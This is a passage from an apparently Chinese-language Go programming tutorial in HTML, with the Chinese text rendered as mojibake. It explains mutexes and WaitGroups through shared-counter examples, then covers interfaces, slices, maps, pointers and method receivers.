åŒ…ä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§ç±»å‹ã€‚åœ¨å¹¶å‘ç¼–ç¨‹ä¸­æ­£ç¡®åœ°ä½¿ç”¨è¿™äº›å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©ä½ é¿å…æ­»é”å’Œæ•°æ®ç«äº‰ï¼Œç¡®ä¿ç¨‹åºçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§ã€‚è®°å¾—å®è·µæ˜¯æœ€å¥½çš„å­¦ä¹ æ–¹å¼ï¼Œå¤šå°è¯•ç¼–å†™ä¸€äº›å¹¶å‘ä»£ç ï¼Œä½ ä¼šè¶Šæ¥è¶Šç†Ÿç»ƒçš„ï¼ğŸ’ªğŸ“šğŸ’»</p><p>å½“ç„¶å¯ä»¥ï¼äº’æ–¥é”ï¼ˆMutexï¼‰æ˜¯å¹¶å‘ç¼–ç¨‹ä¸­ä¸€ç§éå¸¸é‡è¦çš„æœºåˆ¶ï¼Œç”¨äºæ§åˆ¶å¯¹å…±äº«èµ„æºçš„è®¿é—®ï¼Œä»¥ç¡®ä¿åœ¨ä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ª goroutine å¯ä»¥è®¿é—®è¯¥èµ„æºã€‚è¿™æœ‰åŠ©äºé¿å…å¹¶å‘æ—¶å‡ºç°çš„æ•°æ®ç«äº‰å’Œä¸ä¸€è‡´çš„é—®é¢˜ã€‚è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥è¯¦ç»†ç†è§£äº’æ–¥é”çš„ä½¿ç”¨ã€‚</p><h3 id="äº’æ–¥é”ï¼ˆMutexï¼‰çš„åŸºæœ¬æ¦‚å¿µ"><a href="#äº’æ–¥é”ï¼ˆMutexï¼‰çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="äº’æ–¥é”ï¼ˆMutexï¼‰çš„åŸºæœ¬æ¦‚å¿µ"></a>äº’æ–¥é”ï¼ˆMutexï¼‰çš„åŸºæœ¬æ¦‚å¿µ</h3><ul><li><strong>äº’æ–¥é”</strong>ç”¨äºåœ¨å¤šä¸ª goroutines è®¿é—®å…±äº«èµ„æºæ—¶æä¾›å®‰å…¨çš„è®¿é—®æ–¹å¼ã€‚</li><li>ä»»ä½•æ—¶å€™åªæœ‰ä¸€ä¸ª goroutine èƒ½å¤ŸæŒæœ‰é”ã€‚</li><li>å¦‚æœä¸€ä¸ª goroutine å·²ç»æŒæœ‰äº†é”ï¼Œå…¶ä»–å°è¯•è·å–é”çš„ goroutine å°†ä¼šç­‰å¾…ï¼ˆé˜»å¡ï¼‰ï¼Œç›´åˆ°é”è¢«é‡Šæ”¾ã€‚</li></ul><h3 id="ç¤ºä¾‹ï¼šå…±äº«è®¡æ•°å™¨"><a href="#ç¤ºä¾‹ï¼šå…±äº«è®¡æ•°å™¨" class="headerlink" title="ç¤ºä¾‹ï¼šå…±äº«è®¡æ•°å™¨"></a>ç¤ºä¾‹ï¼šå…±äº«è®¡æ•°å™¨</h3><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå…±äº«çš„è®¡æ•°å™¨ï¼Œå¤šä¸ª goroutines åŒæ—¶å¯¹å…¶è¿›è¡Œå¢åŠ æ“ä½œã€‚ä¸ä½¿ç”¨äº’æ–¥é”çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå‘ç”Ÿæ•°æ®ç«äº‰ï¼Œå¯¼è‡´è®¡æ•°å™¨çš„å€¼å‡ºé”™ã€‚</p><p>ä¸‹é¢æ˜¯ä½¿ç”¨äº’æ–¥é”æ¥ç¡®ä¿å®‰å…¨è®¿é—®å…±äº«è®¡æ•°å™¨çš„ä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> mu sync.Mutex</span><br><span class="line">    <span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯åŠ¨ 100 ä¸ª goroutines æ¥å¢åŠ è®¡æ•°å™¨</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">                mu.Lock()   <span class="comment">// åœ¨è®¿é—®å…±äº«èµ„æºå‰åŠ é”</span></span><br><span class="line">                count++     <span class="comment">// ä¿®æ”¹å…±äº«èµ„æº</span></span><br><span class="line">                mu.Unlock() <span class="comment">// å®Œæˆæ“ä½œåè§£é”</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç­‰å¾…ä¸€ç§’ç¡®ä¿æ‰€æœ‰ goroutine å®Œæˆ</span></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Final count:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p><ul><li>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>mu</code> çš„ <code>sync.Mutex</code> å’Œä¸€ä¸ªå…±äº«çš„ <code>count</code> è®¡æ•°å™¨ã€‚</li><li>å¯åŠ¨äº† 100 ä¸ª goroutinesï¼Œæ¯ä¸ª goroutine ä¼šå°è¯•å°†è®¡æ•°å™¨å¢åŠ  10 æ¬¡ã€‚</li><li>æ¯æ¬¡å¢åŠ æ“ä½œå‰ï¼Œæˆ‘ä»¬é€šè¿‡ <code>mu.Lock()</code> åŠ é”ï¼Œç¡®ä¿åœ¨ä¿®æ”¹ <code>count</code> æ—¶ä¸ä¼šæœ‰å…¶ä»– goroutine åŒæ—¶è®¿é—®å®ƒã€‚</li><li>æ“ä½œå®Œæˆåï¼Œä½¿ç”¨ <code>mu.Unlock()</code> è§£é”ã€‚</li></ul><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå³ä½¿å¤šä¸ª goroutine å¹¶å‘æ‰§è¡Œï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ç¡®ä¿ <code>count</code> çš„å€¼åœ¨ä»»ä½•æ—¶å€™éƒ½æ˜¯å‡†ç¡®çš„ï¼Œé¿å…äº†æ•°æ®ç«äº‰ã€‚</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>äº’æ–¥é”æ˜¯å¹¶å‘ç¼–ç¨‹ä¸­ä¿æŠ¤å…±äº«èµ„æºçš„é‡è¦å·¥å…·ã€‚æ­£ç¡®ä½¿ç”¨å®ƒä»¬èƒ½å¤Ÿç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§å’Œç¨‹åºçš„ç¨³å®šæ€§ã€‚ä½†æ˜¯è¦æ³¨æ„ï¼Œè¿‡åº¦ä½¿ç”¨é”å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºæ€§èƒ½ä¸‹é™ï¼Œå› ä¸ºå®ƒé™åˆ¶äº†å¹¶å‘çš„ç¨‹åº¦ã€‚å› æ­¤ï¼Œåˆç†è®¾è®¡é”çš„ä½¿ç”¨ç­–ç•¥æ˜¯å¹¶å‘ç¼–ç¨‹çš„ä¸€ä¸ªé‡è¦æ–¹é¢ã€‚ğŸ’»ğŸ”ğŸ‘</p><p>å¥½çš„ï¼Œæˆ‘æ¥è®¾è®¡ä¸€ä¸ªæ—¢ä½¿ç”¨äº’æ–¥é”ï¼ˆ<code>sync.Mutex</code>ï¼‰åˆä½¿ç”¨å·¥ä½œç»„ï¼ˆ<code>sync.WaitGroup</code>ï¼‰çš„ç¤ºä¾‹ã€‚åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†åˆ›å»ºå¤šä¸ª goroutines æ¥æ›´æ–°ä¸€ä¸ªå…±äº«æ•°æ®ç»“æ„ï¼Œæ¯”å¦‚ä¸€ä¸ªè®¡æ•°å™¨ã€‚æˆ‘ä»¬ä¼šä½¿ç”¨äº’æ–¥é”æ¥ä¿æŠ¤è¿™ä¸ªå…±äº«æ•°æ®ï¼Œä»¥é¿å…æ•°æ®ç«äº‰ï¼ŒåŒæ—¶ä½¿ç”¨å·¥ä½œç»„æ¥ç­‰å¾…æ‰€æœ‰ goroutine å®Œæˆã€‚</p><h3 id="ç¤ºä¾‹æè¿°"><a href="#ç¤ºä¾‹æè¿°" class="headerlink" title="ç¤ºä¾‹æè¿°"></a>ç¤ºä¾‹æè¿°</h3><ul><li><strong>ç›®æ ‡</strong>ï¼šåˆ›å»ºå¤šä¸ª goroutinesï¼Œæ¯ä¸ª goroutine å¯¹å…±äº«è®¡æ•°å™¨å¢åŠ ç‰¹å®šçš„å€¼ã€‚</li><li><strong>å·¥å…·</strong>ï¼š<ul><li><strong>äº’æ–¥é”ï¼ˆ<code>sync.Mutex</code>ï¼‰</strong>ï¼šç¡®ä¿æ¯æ¬¡åªæœ‰ä¸€ä¸ª goroutine èƒ½å¤Ÿè®¿é—®å¹¶ä¿®æ”¹è®¡æ•°å™¨ã€‚</li><li><strong>å·¥ä½œç»„ï¼ˆ<code>sync.WaitGroup</code>ï¼‰</strong>ï¼šç­‰å¾…æ‰€æœ‰ goroutine å®Œæˆã€‚</li></ul></li></ul><h3 id="ç¤ºä¾‹ä»£ç -2"><a href="#ç¤ºä¾‹ä»£ç -2" class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">var</span> mu sync.Mutex</span><br><span class="line">    <span class="keyword">var</span> count <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå¢åŠ è®¡æ•°å™¨</span></span><br><span class="line">    increment := <span class="function"><span class="keyword">func</span><span class="params">(inc <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wg.Done() <span class="comment">// ç¡®ä¿åœ¨å‡½æ•°ç»“æŸæ—¶é€šçŸ¥ WaitGroup</span></span><br><span class="line">        mu.Lock()       <span class="comment">// åœ¨ä¿®æ”¹å…±äº«èµ„æºå‰åŠ é”</span></span><br><span class="line">        count += inc    <span class="comment">// ä¿®æ”¹å…±äº«èµ„æº</span></span><br><span class="line">        mu.Unlock()     <span class="comment">// å®Œæˆæ“ä½œåè§£é”</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯åŠ¨å¤šä¸ª goroutines</span></span><br><span class="line">    increments := []<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, inc := <span class="keyword">range</span> increments &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>) <span class="comment">// ä¸ºæ¯ä¸ª goroutine å¢åŠ è®¡æ•°</span></span><br><span class="line">        <span class="keyword">go</span> increment(inc)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wg.Wait() <span class="comment">// ç­‰å¾…æ‰€æœ‰ goroutine å®Œæˆ</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Final count:&quot;</span>, count)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p><ul><li>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>increment</code> çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œå°†å…¶åŠ åˆ° <code>count</code> ä¸Šã€‚</li><li>ä¸ºæ¯ä¸ªè¦æ‰§è¡Œçš„ <code>increment</code> æ“ä½œï¼Œæˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªæ–°çš„ goroutineã€‚</li><li>æ¯ä¸ª goroutine å¼€å§‹å‰ï¼Œä½¿ç”¨ <code>wg.Add(1)</code> å¢åŠ å·¥ä½œç»„çš„è®¡æ•°ã€‚</li><li>åœ¨ <code>increment</code> å‡½æ•°å†…éƒ¨ï¼Œé¦–å…ˆä½¿ç”¨ <code>defer wg.Done()</code> æ¥ç¡®ä¿å‡½æ•°ç»“æŸæ—¶ï¼Œé€šçŸ¥å·¥ä½œç»„ä¸€ä¸ªä»»åŠ¡å·²ç»å®Œæˆã€‚</li><li>ä½¿ç”¨ <code>mu.Lock()</code> å’Œ <code>mu.Unlock()</code> æ¥ä¿æŠ¤å¯¹ <code>count</code> çš„è®¿é—®å’Œä¿®æ”¹ã€‚</li><li>æœ€åï¼Œ<code>wg.Wait()</code> åœ¨ <code>main</code> å‡½æ•°ä¸­ç­‰å¾…æ‰€æœ‰ goroutine å®Œæˆï¼Œç„¶åæ‰“å°å‡ºæœ€ç»ˆçš„ <code>count</code> å€¼ã€‚</li></ul><h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>è¿™ä¸ªä¾‹å­å±•ç¤ºäº†å¦‚ä½•åœ¨å¹¶å‘ç¼–ç¨‹ä¸­åŒæ—¶ä½¿ç”¨äº’æ–¥é”å’Œå·¥ä½œç»„æ¥å®‰å…¨åœ°æ›´æ–°å…±äº«èµ„æºï¼Œå¹¶ç­‰å¾…å¤šä¸ªå¹¶å‘æ“ä½œçš„å®Œæˆã€‚è¿™ç§æ¨¡å¼åœ¨å¤„ç†å¹¶å‘æ•°æ®å…±äº«å’ŒåŒæ­¥ä»»åŠ¡æ—¶éå¸¸æœ‰ç”¨ã€‚è®°å¾—å¤šå®è·µï¼Œè¿™æ ·ä½ ä¼šå¯¹ Go çš„å¹¶å‘æœºåˆ¶æœ‰æ›´æ·±çš„ç†è§£å’ŒæŒæ¡ï¼ğŸ”’ğŸ”„ğŸ’»ğŸš€</p><h1 id="ç»†èŠ‚è¡¥å……"><a href="#ç»†èŠ‚è¡¥å……" class="headerlink" title="ç»†èŠ‚è¡¥å……"></a>ç»†èŠ‚è¡¥å……</h1><p>åœ¨ Go è¯­è¨€ä¸­ï¼Œæ¥å£ï¼ˆinterfaceï¼‰ã€åˆ‡ç‰‡ï¼ˆsliceï¼‰ã€æ˜ å°„ï¼ˆmapï¼‰å’ŒæŒ‡é’ˆï¼ˆpointerï¼‰æ˜¯éå¸¸æ ¸å¿ƒçš„æ¦‚å¿µã€‚ä¸‹é¢æˆ‘å°†é€ä¸€è¿›è¡Œè¯¦ç»†è€Œæ˜“æ‡‚çš„ä»‹ç»ã€‚</p><h3 id="1-æ¥å£ï¼ˆInterfaceï¼‰"><a href="#1-æ¥å£ï¼ˆInterfaceï¼‰" class="headerlink" title="1. æ¥å£ï¼ˆInterfaceï¼‰"></a>1. æ¥å£ï¼ˆInterfaceï¼‰</h3><p>æ¥å£æ˜¯ä¸€ç§ç±»å‹ï¼Œå®ƒå®šä¹‰äº†ä¸€ç»„æ–¹æ³•ï¼Œä½†è¿™äº›æ–¹æ³•ä¸éœ€è¦å®ç°ã€‚ä»»ä½•å®šä¹‰äº†è¿™äº›æ–¹æ³•çš„ç±»å‹éƒ½è‡ªåŠ¨åœ°å®ç°äº†è¿™ä¸ªæ¥å£ã€‚</p><h4 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h4><ul><li>å®šä¹‰æ¥å£ï¼š<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span> &#123;</span><br><span class="line">    Area() <span class="type">float64</span></span><br><span class="line">    Perimeter() <span class="type">float64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>å®ç°æ¥å£ï¼šåªè¦ä¸€ä¸ªç±»å‹æä¾›äº†æ¥å£ä¸­æ‰€æœ‰æ–¹æ³•çš„å®ç°ï¼Œå®ƒå°±å®ç°äº†è¯¥æ¥å£ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Length, Width <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.Length * r.Width</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Perimeter() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (r.Length + r.Width)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="é«˜çº§ç”¨æ³•"><a href="#é«˜çº§ç”¨æ³•" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h4><ul><li><strong>æ¥å£ç»„åˆ</strong>ï¼šå¯ä»¥é€šè¿‡ç»„åˆç°æœ‰çš„æ¥å£æ¥åˆ›å»ºæ–°æ¥å£ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Geometry <span class="keyword">interface</span> &#123;</span><br><span class="line">    Shape</span><br><span class="line">    SomeOtherMethod()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>ç©ºæ¥å£</strong>ï¼šç©ºæ¥å£ <code>interface&#123;&#125;</code> å¯ä»¥è¡¨ç¤ºä»»ä½•ç±»å‹ï¼Œå¸¸ç”¨äºæ³›å‹ç¼–ç¨‹æˆ–å¤„ç†æœªçŸ¥ç±»å‹çš„å€¼ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DoSomething</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-åˆ‡ç‰‡ï¼ˆSliceï¼‰"><a href="#2-åˆ‡ç‰‡ï¼ˆSliceï¼‰" class="headerlink" title="2. åˆ‡ç‰‡ï¼ˆSliceï¼‰"></a>2. åˆ‡ç‰‡ï¼ˆSliceï¼‰</h3><p>åˆ‡ç‰‡æ˜¯å¯¹æ•°ç»„çš„æŠ½è±¡ï¼ŒGo ä¸­çš„åˆ‡ç‰‡æ›´åŠ å¼ºå¤§å’Œçµæ´»ã€‚</p><h4 id="åŸºæœ¬ç”¨æ³•-1"><a href="#åŸºæœ¬ç”¨æ³•-1" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h4><ul><li>åˆ›å»ºåˆ‡ç‰‡ï¼šä½¿ç”¨ <code>make</code> å‡½æ•°æˆ–å­—é¢é‡ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">10</span>) <span class="comment">// é•¿åº¦ä¸º10</span></span><br><span class="line">s2 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="é«˜çº§ç”¨æ³•-1"><a href="#é«˜çº§ç”¨æ³•-1" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h4><ul><li><strong>åˆ‡ç‰‡è¿½åŠ </strong>ï¼šä½¿ç”¨ <code>append</code> å‡½æ•°å‘åˆ‡ç‰‡è¿½åŠ å…ƒç´ ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">s = <span class="built_in">append</span>(s, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>) <span class="comment">// s ç°åœ¨æ˜¯ [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></li><li><strong>åˆ‡ç‰‡æˆªå–</strong>ï¼šå¯ä»¥é€šè¿‡åˆ‡ç‰‡çš„æˆªå–åˆ›å»ºæ–°çš„åˆ‡ç‰‡ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">s2 := s[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">// s2 æ˜¯ [2, 3]</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-æ˜ å°„ï¼ˆMapï¼‰"><a href="#3-æ˜ å°„ï¼ˆMapï¼‰" class="headerlink" title="3. æ˜ å°„ï¼ˆMapï¼‰"></a>3. æ˜ å°„ï¼ˆMapï¼‰</h3><p>æ˜ å°„æ˜¯é”®å€¼å¯¹çš„é›†åˆã€‚</p><h4 id="åŸºæœ¬ç”¨æ³•-2"><a href="#åŸºæœ¬ç”¨æ³•-2" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h4><ul><li>åˆ›å»ºæ˜ å°„ï¼šä½¿ç”¨ <code>make</code> å‡½æ•°ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">m[<span class="string">&quot;key&quot;</span>] = <span class="number">42</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="é«˜çº§ç”¨æ³•-2"><a href="#é«˜çº§ç”¨æ³•-2" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h4><ul><li><strong>è¿­ä»£æ˜ å°„</strong>ï¼šä½¿ç”¨ <code>range</code> éå†æ˜ å°„ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> m &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Key:&quot;</span>, key, <span class="string">&quot;Value:&quot;</span>, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>æ˜ å°„çš„åˆ‡ç‰‡</strong>ï¼šå¯ä»¥åˆ›å»ºæ˜ å°„çš„åˆ‡ç‰‡æ¥å®ç°åŠ¨æ€çš„åµŒå¥—ç»“æ„ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ms := <span class="built_in">make</span>([]<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">ms = <span class="built_in">append</span>(ms, <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;key&quot;</span>: <span class="number">42</span>&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-æŒ‡é’ˆï¼ˆPointerï¼‰"><a href="#4-æŒ‡é’ˆï¼ˆPointerï¼‰" class="headerlink" title="4. æŒ‡é’ˆï¼ˆPointerï¼‰"></a>4. æŒ‡é’ˆï¼ˆPointerï¼‰</h3><p>æŒ‡é’ˆå­˜å‚¨äº†å€¼åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚</p><h4 id="åŸºæœ¬ç”¨æ³•-3"><a href="#åŸºæœ¬ç”¨æ³•-3" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h4><ul><li>ä½¿ç”¨ <code>&amp;</code> è·å–å˜é‡çš„åœ°å€ï¼Œä½¿ç”¨ <code>*</code> æ¥è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a := <span class="number">42</span></span><br><span class="line">p := &amp;a <span class="comment">// p æ˜¯æŒ‡å‘ a çš„æŒ‡é’ˆ</span></span><br><span class="line">fmt.Println(*p) <span class="comment">// è¯»å– p æŒ‡å‘çš„å€¼</span></span><br><span class="line">*p = <span class="number">21</span> <span class="comment">// ä¿®æ”¹ p æŒ‡å‘çš„å€¼</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="é«˜çº§ç”¨æ³•-3"><a href="#é«˜çº§ç”¨æ³•-3" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h4><ul><li><strong>ç»“æ„ä½“ä¸æŒ‡é’ˆ</strong>ï¼šå¯ä»¥ä½¿ç”¨æŒ‡é’ˆæ¥è®¿é—®æˆ–ä¿®æ”¹ç»“æ„ä½“çš„æˆå‘˜ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">     X, Y <span class="type">float64</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"> p := &amp;v</span><br><span class="line"> p.X = <span class="number">4.5</span> <span class="comment">// é€šè¿‡æŒ‡é’ˆä¿®æ”¹ v çš„ X å€¼</span></span><br></pre></td></tr></table></figure></li><li><strong>æŒ‡é’ˆæ¥æ”¶è€…</strong>ï¼šåœ¨æ–¹æ³•å®šä¹‰ä¸­ä½¿ç”¨æŒ‡é’ˆæ¥æ”¶è€…ï¼Œå¯ä»¥ä¿®æ”¹æ¥æ”¶è€…æŒ‡å‘çš„å€¼ã€‚<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> Scale(f <span class="type">float64</span>) &#123;</span><br><span class="line">    v.X = v.X * f</span><br><span class="line">    v.Y = v.Y * f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç†è§£å’Œç†Ÿç»ƒä½¿ç”¨æ¥å£ã€åˆ‡ç‰‡ã€æ˜ å°„å’ŒæŒ‡é’ˆå¯¹äºç¼–å†™é«˜æ•ˆå’Œçµæ´»çš„ Go ç¨‹åºè‡³å…³é‡è¦ã€‚è¿™äº›æ¦‚å¿µæ˜¯ Go è¯­è¨€çš„åŸºçŸ³ï¼Œå®ƒä»¬æä¾›äº†å¼ºå¤§çš„å·¥å…·æ¥æ„å»ºå¤æ‚å’Œé«˜æ€§èƒ½çš„åº”ç”¨ç¨‹åºã€‚ğŸ’»ğŸ”§ğŸš€</p><h1 id="æ–¹æ³•æ¥æ”¶è€…"><a href="#æ–¹æ³•æ¥æ”¶è€…" class="headerlink" title="æ–¹æ³•æ¥æ”¶è€…"></a>æ–¹æ³•æ¥æ”¶è€…</h1><p>åœ¨ Go è¯­è¨€ä¸­ï¼Œ<code>(r Rectangle)</code> è¿™éƒ¨åˆ†è¢«ç§°ä¸º<strong>æ–¹æ³•æ¥æ”¶è€…</strong>ï¼Œç±»ä¼¼äºå…¶ä»–è¯­è¨€ä¸­çš„â€œç±»æ–¹æ³•â€ã€‚ä¸è¿‡ï¼ŒGo æ²¡æœ‰ç±»ï¼ˆclassï¼‰çš„æ¦‚å¿µï¼Œè€Œæ˜¯ä½¿ç”¨ç»“æ„ä½“ï¼ˆstructï¼‰å’Œæ–¹æ³•æ¥æ”¶è€…æ¥å®ç°ç±»ä¼¼çš„åŠŸèƒ½ã€‚</p><h3 id="æ–¹æ³•æ¥æ”¶è€…ï¼ˆMethod-Receiverï¼‰"><a href="#æ–¹æ³•æ¥æ”¶è€…ï¼ˆMethod-Receiverï¼‰" class="headerlink" title="æ–¹æ³•æ¥æ”¶è€…ï¼ˆMethod Receiverï¼‰"></a>æ–¹æ³•æ¥æ”¶è€…ï¼ˆMethod Receiverï¼‰</h3><p>åœ¨å‡½æ•°å®šä¹‰å‰çš„ <code>(r Rectangle)</code> å°±æ˜¯æ–¹æ³•æ¥æ”¶è€…çš„å£°æ˜ï¼Œå®ƒæŒ‡å®šäº†è¿™ä¸ªå‡½æ•°æ˜¯ç»‘å®šåœ¨ <code>Rectangle</code> ç±»å‹ä¸Šçš„ã€‚è¿™æ„å‘³ç€è¿™ä¸ªå‡½æ•°ï¼ˆ<code>Area</code>ï¼‰å¯ä»¥åœ¨ <code>Rectangle</code> 